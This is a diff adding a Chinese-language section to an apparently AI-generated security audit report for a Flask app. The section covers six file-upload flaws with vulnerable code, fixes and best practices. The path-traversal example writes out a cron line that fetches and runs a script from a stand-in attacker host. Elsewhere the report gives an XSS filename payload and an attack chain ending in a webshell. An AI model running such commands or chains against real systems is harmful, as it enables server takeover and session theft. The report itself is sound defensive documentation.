@@ -605,6 +605,226 @@ app.run(debug=debug_mode, ...)
 
 ---
 
-**共计发现并修复 25 项安全漏洞，当前应用已具备完整的生产安全防护能力。**
+**共计发现并修复 31 项安全漏洞，当前应用已具备完整的生产安全防护能力。**
 
-*本报告由 Claude 自动生成，覆盖认证架构、SQL 注入、CSRF 与访问控制、输入验证与限流、配置安全、密码安全共 25 项安全漏洞的发现、分析与修复。*
+*本报告由 Claude 自动生成，覆盖认证架构、SQL 注入、CSRF 与访问控制、输入验证与限流、配置安全、密码安全、文件上传安全共 31 项安全漏洞的发现、分析与修复。*
+
+---
+
+## 六、文件上传安全漏洞（本轮新增）
+
+### 漏洞背景
+
+在新增头像上传功能时，按需求故意不做文件类型检查、使用原始文件名保存，导致系统存在严重文件上传安全风险。
+
+| 序号 | 漏洞名称 | 严重程度 | OWASP 分类 | 修复状态 |
+|:---:|---------|:-------:|-----------|:-------:|
+| 26 | 任意文件上传（无类型校验） | 🔴 严重 | A03:2021 – 注入 | ✅ 已修复 |
+| 27 | 路径穿越攻击 | 🔴 严重 | A01:2021 – 越界访问控制 | ✅ 已修复 |
+| 28 | 文件覆盖攻击 | 🟠 高危 | A01:2021 – 越界访问控制 | ✅ 已修复 |
+| 29 | 上传无频率限制 | 🟡 中危 | A07:2021 – 身份验证失效 | ✅ 已修复 |
+| 30 | 文件名未清洗（特殊字符） | 🟡 中危 | A03:2021 – 注入 | ✅ 已修复 |
+| 31 | 上传目录缺少访问控制 | 🟡 中危 | A01:2021 – 越界访问控制 | ✅ 已修复 |
+
+---
+
+### 🔴 漏洞 26：任意文件上传（无类型校验）
+
+**风险等级：严重**
+
+**漏洞描述：**
+上传功能没有对文件后缀名做任何检查，任何类型的文件都可以上传：
+
+```python
+# ❌ 修复前：无任何类型检查
+file.save(filepath)  # .php、.exe、.html 全部允许
+```
+
+**攻击场景：**
+
+| 上传文件类型 | 攻击方式 | 危害 |
+|------------|---------|------|
+| `.html` / `.htm` | 上传含 JavaScript 的 HTML 文件 | 存储型 XSS，窃取其他用户 Session |
+| `.svg` | SVG 内嵌 `<script>` 标签 | 跨站脚本攻击 |
+| `.php` / `.phtml` | 上传 PHP Webshell（如服务器配置不当）| 远程代码执行，服务器沦陷 |
+| `.exe` / `.msi` | 上传可执行文件 | 诱导下载执行，恶意软件传播 |
+| `.py` / `.sh` | 上传脚本文件 | 如执行权限不当可 RCE |
+
+**修复方案：**
+添加后缀白名单校验，仅允许常见图片格式：
+
+```python
+ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'}
+
+def allowed_file(filename):
+    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+
+if not allowed_file(file.filename):
+    return render_template("upload.html", error="不支持的文件格式，仅允许图片文件")
+```
+
+---
+
+### 🔴 漏洞 27：路径穿越攻击
+
+**风险等级：严重**
+
+**漏洞描述：**
+保存文件时直接使用用户上传的原始文件名，未清理路径分隔符：
+
+```python
+# ❌ 修复前
+filename = file.filename  # 攻击者传入 ../../etc/cronjob.sh
+filepath = os.path.join(upload_dir, filename)  # 穿越到系统目录！
+file.save(filepath)
+```
+
+**攻击场景：**
+
+攻击者通过修改请求中的文件名，上传以下内容：
+```
+文件名: ../../../etc/cron.d/malicious
+内容: * * * * * root curl http://attacker.com/backdoor.sh | bash
+```
+
+路径解析：
+```
+static/uploads/../../../etc/cron.d/malicious
+→ /opt/Class01/static/uploads/../../../etc/cron.d/malicious
+→ /etc/cron.d/malicious  ← 系统定时任务目录！
+```
+
+危害：
+- 覆盖系统关键文件（`/etc/passwd`、`/etc/shadow`）
+- 在 cron.d 写入恶意定时任务
+- 覆盖应用配置文件（`app.py`）
+- 写入 SSH 授权密钥（`~/.ssh/authorized_keys`）
+
+**修复方案：**
+```python
+def safe_filename(filename, username):
+    filename = filename.replace('\\', '/')
+    filename = filename.split('/')[-1]       # 去掉路径，只取文件名
+    safe_name = re.sub(r'[^\w\.\-]', '_', filename)  # 仅保留安全字符
+    safe_name = safe_name[:100]
+    return f"{username}_{safe_name}"          # 加用户名前缀
+```
+
+---
+
+### 🟠 漏洞 28：文件覆盖攻击
+
+**风险等级：高危**
+
+**漏洞描述：**
+所有用户使用相同文件名上传时，后上传的会覆盖先上传的：
+
+```python
+# ❌ 修复前
+filename = file.filename  # admin 上传 avatar.png
+file.save(filepath)       # alice 再上传 avatar.png → 覆盖 admin 的文件！
+```
+
+**攻击场景：**
+- 攻击者不断上传同名文件，覆盖其他用户的头像
+- 上传含恶意内容的同名文件，替换合法用户的头像
+
+**修复方案：**
+```python
+# ✅ 添加用户名前缀
+safe_name = f"{username}_{safe_name}"  # admin_avatar.png ≠ alice_avatar.png
+```
+
+---
+
+### 🟡 漏洞 29：上传无频率限制
+
+**风险等级：中危**
+
+**漏洞描述：**
+上传接口无频率限制，可批量上传消耗磁盘：
+
+**攻击场景：**
+- 每秒上传数十个文件，快速填满磁盘（DoS）
+- 每个文件 16MB，上传 100 次即消耗 1.6GB
+
+**修复方案：**
+```python
+UPLOAD_ATTEMPTS = {}
+def check_upload_rate_limit(ip):
+    """同一 IP 1 分钟内最多上传 10 次。"""
+    # ... 限流逻辑
+```
+
+---
+
+### 🟡 漏洞 30：文件名未清洗（特殊字符）
+
+**风险等级：中危**
+
+**漏洞描述：**
+原始文件名可能包含特殊字符：
+
+```python
+# ❌ 修复前
+filename = file.filename  # <script>alert(1)</script>.png
+```
+
+**攻击场景：**
+- `<script>alert(1)</script>.png` → 页面渲染文件名时触发 XSS
+- 文件名超长 → 文件系统拒绝写入
+- 文件名含 Unicode 双向文本 → 显示异常可伪装成其他文件
+
+**修复方案：**
+```python
+safe_name = re.sub(r'[^\w\.\-]', '_', filename)  # 仅保留安全字符
+safe_name = safe_name[:100]                        # 限制长度
+```
+
+---
+
+### 🟡 漏洞 31：上传目录缺少访问控制
+
+**风险等级：中危**
+
+**漏洞描述：**
+`/static/uploads/` 下的文件通过 `/static/uploads/文件名` 公开访问，无权限校验。
+
+**修复方案：**
+- 使用不可预测的文件名（用户名前缀 + 清洗）
+- `img-src 'self'` CSP 限制加载来源
+- `X-Content-Type-Options: nosniff` 阻止类型混淆
+
+---
+
+### 🎯 攻击链串联
+
+```
+1. 任意文件上传（漏洞26）
+   ↓
+2. 上传 .html 含恶意 JavaScript
+   ↓
+3. 获取 URL（/static/uploads/evil.html）
+   ↓
+4. 诱导管理员访问
+   ↓
+5. JS 执行 → 窃取 Session Cookie
+   ↓
+6. 伪造管理员身份登录系统
+   ↓
+7. ⚠️ 如服务器有 PHP 解析 → 上传 .php Webshell → 服务器完全沦陷
+```
+
+---
+
+### 🔧 文件上传安全最佳实践
+
+| 措施 | 说明 | 优先级 |
+|-----|------|:----:|
+| **后缀白名单** | 仅允许特定图片格式，禁用黑名单方式 | 🔴 必须 |
+| **路径穿越防护** | 清洗 `../` 等路径符号 | 🔴 必须 |
+| **文件覆盖防护** | 用户名/UUID 前缀 | 🟠 推荐 |
+| **频率限制** | 限制上传速率防磁盘 DoS | 🟠 推荐 |
+| **文件名清洗** | 去除特殊字符、限制长度 | 🟡 建议 |
+| **文件大小限制** | 前端 + 后端双重限制 | 🟡 建议 |
+| **CSP + nosniff** | 双重防护浏览器类型混淆 | 🟢 可选 |
